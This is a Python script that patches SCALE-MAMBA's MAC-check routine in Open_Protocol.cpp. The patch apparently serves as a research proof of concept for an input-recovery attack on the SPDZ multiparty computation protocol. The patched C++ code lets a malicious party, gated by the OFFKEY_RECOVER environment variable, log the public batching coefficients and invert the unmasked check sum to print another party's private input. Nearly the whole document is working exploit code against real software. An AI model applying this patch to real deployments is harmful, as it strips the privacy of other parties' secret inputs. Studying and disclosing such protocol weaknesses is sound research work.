#!/usr/bin/env python3
"""Instrument SCALE-MAMBA's MAC check for the input-recovery attack.

SCALE-MAMBA uses the *unmasked* SPDZ MAC check (Damgard et al., 2013): in
`Open_Protocol::RunOpenCheck` each party commits to and opens its own share
`tau_i = gamma_i - a * alpha_i`, and the batch accepts iff `sum_i tau_i == 0`.
For MAC equation j the opened sum is

    t_j = sum_k r_k * ( M_k - alpha * v_k )              (r_k public, jointly random)

where the sum runs over the openings k batched into this check, `M_k` is the
reconstructed MAC of opening k, and `v_k` its opened value. Every correctly
authenticated opening contributes 0. With a single off-key opening
`d = y - b` (y carried under alpha, b fresh under alpha+1) the only nonzero term
is `M_d - (alpha+1) d = g - y`, so

    t = r * (g - y)   ==>   y = g - t / r.

Because the check is unmasked, the malicious party already holds every `tau_i`
after the commit-and-open, and it drew the same public coefficients `r_k`, so it
can invert this and read `y` outright -- even though the check then aborts and
the opened output is independent of y. This realizes the stronger attack,
upgrading the selective-failure oracle to full input recovery.

The instrumentation is gated on the environment variable OFFKEY_RECOVER, which
only the malicious party sets. It reads state the party already has and never
changes a message sent or the accept/abort decision, so an honest party running
the same binary without the variable is completely unaffected.
"""
from __future__ import annotations

import sys
from pathlib import Path

SRC = Path(sys.argv[1] if len(sys.argv) > 1 else "src/LSSS/Open_Protocol.cpp")

code = SRC.read_text()

# 1. getenv / atol
if "#include <cstdlib>" not in code:
    code = code.replace(
        "#include <iostream>\n",
        "#include <cstdlib>\n#include <iostream>\n",
        1,
    )

# 2. Replace the coefficient loop + accept/abort loop so that (a) the batching
#    coefficients are recorded, (b) the opened sums are computed once, (c) the
#    attacker inverts them before the abort, and (d) the original accept/abort
#    behaviour is preserved exactly.
OLD = """      gfp r, temp;
      for (int j= 0; j < neqs; j++)
        {
          a[j].assign_zero();
          gami[j].assign_zero();
          for (int i= 0; i < open_cnt[connection]; i++)
            {
              r.randomize(G);
              temp.mul(r, vals[connection][i]);
              a[j].add(temp);

              temp.mul(r, macs[connection][j][i]);
              gami[j].add(temp);
            }
          macs[connection][j].erase(macs[connection][j].begin(), macs[connection][j].begin() + open_cnt[connection]);
          temp.mul(a[j], P.get_mac_key(j));
          tau[j][P.whoami()].sub(gami[j], temp);
        }
      vals[connection].erase(vals[connection].begin(), vals[connection].begin() + open_cnt[connection]);

      Commit_And_Open(tau, P, false, connection);

      gfp t;
      for (int j= 0; j < neqs; j++)
        {
          t.assign_zero();
          for (unsigned int i= 0; i < P.nplayers(); i++)
            {
              t.add(tau[j][i]);
            }
          if (!t.is_zero())
            {
              throw mac_fail();
            }
        }"""

NEW = """      gfp r, temp;
      // ATTACK (input recovery): when OFFKEY_RECOVER is set the
      // malicious party records the public batching coefficients r and the
      // opened values v so it can invert the unmasked check value below. This
      // only reads state the party already holds and changes no message sent
      // nor the accept/abort decision, so an honest party running the same
      // binary without the variable behaves identically.
      bool atk_rec= (getenv(\"OFFKEY_RECOVER\") != NULL);
      vector<vector<gfp>> Rlog;
      vector<gfp> Vlog;
      if (atk_rec)
        {
          Rlog.resize(neqs, vector<gfp>(open_cnt[connection]));
          Vlog.resize(open_cnt[connection]);
          for (int i= 0; i < open_cnt[connection]; i++)
            Vlog[i]= vals[connection][i];
        }
      for (int j= 0; j < neqs; j++)
        {
          a[j].assign_zero();
          gami[j].assign_zero();
          for (int i= 0; i < open_cnt[connection]; i++)
            {
              r.randomize(G);
              if (atk_rec)
                Rlog[j][i]= r;
              temp.mul(r, vals[connection][i]);
              a[j].add(temp);

              temp.mul(r, macs[connection][j][i]);
              gami[j].add(temp);
            }
          macs[connection][j].erase(macs[connection][j].begin(), macs[connection][j].begin() + open_cnt[connection]);
          temp.mul(a[j], P.get_mac_key(j));
          tau[j][P.whoami()].sub(gami[j], temp);
        }
      vals[connection].erase(vals[connection].begin(), vals[connection].begin() + open_cnt[connection]);

      Commit_And_Open(tau, P, false, connection);

      vector<gfp> tsum(neqs);
      for (int j= 0; j < neqs; j++)
        {
          tsum[j].assign_zero();
          for (unsigned int i= 0; i < P.nplayers(); i++)
            {
              tsum[j].add(tau[j][i]);
            }
        }
      // Skip the large offline (sacrifice) batches: the attacker's online
      // openings are a small batch, whereas the FHE offline phase opens tens of
      // thousands of correctly keyed values at once. Logging only small batches
      // keeps the output to the online check that carries the leak.
      if (atk_rec && !Rlog.empty() && Rlog[0].size() >= 1 && Rlog[0].size() <= 8)
        {
          // Unmasked check. The attack arranges the SINGLE off-key opening to be
          // the LAST opening in the batch (the carried y, masked by a fresh
          // alpha+1 square tuple, opened last); every earlier opening is keyed
          // under alpha+1 and contributes 0. So the opened sum for MAC equation 0
          // is t = r_last * (g - y), and y = g - t / r_last. g defaults to 0;
          // OFFKEY_GUESS overrides it. (For the multiplication-circuit recovery
          // there is only one opening, so last == only.)
          gfp g;
          long gg= getenv(\"OFFKEY_GUESS\") ? atol(getenv(\"OFFKEY_GUESS\")) : 0;
          g.assign(gg);
          unsigned int klast= Rlog[0].size() - 1;
          gfp rinv= Rlog[0][klast];
          rinv.invert();
          gfp yrec;
          yrec.mul(tsum[0], rinv);
          gfp cand;
          cand.sub(g, yrec);
          cerr << \"OFFKEY_RECOVER connection=\" << connection
               << \" nopen=\" << Rlog[0].size()
               << \" opening=\" << klast
               << \" v=\" << Vlog[klast]
               << \" t=\" << tsum[0]
               << \" recovered_y=\" << cand << endl;
        }
      for (int j= 0; j < neqs; j++)
        {
          if (!tsum[j].is_zero())
            {
              throw mac_fail();
            }
        }"""

if OLD not in code:
    sys.exit("[offkey_recover] RunOpenCheck target block not found; "
             "SCALE-MAMBA source may have changed.")
code = code.replace(OLD, NEW, 1)
SRC.write_text(code)
print("[offkey_recover] instrumented", SRC)
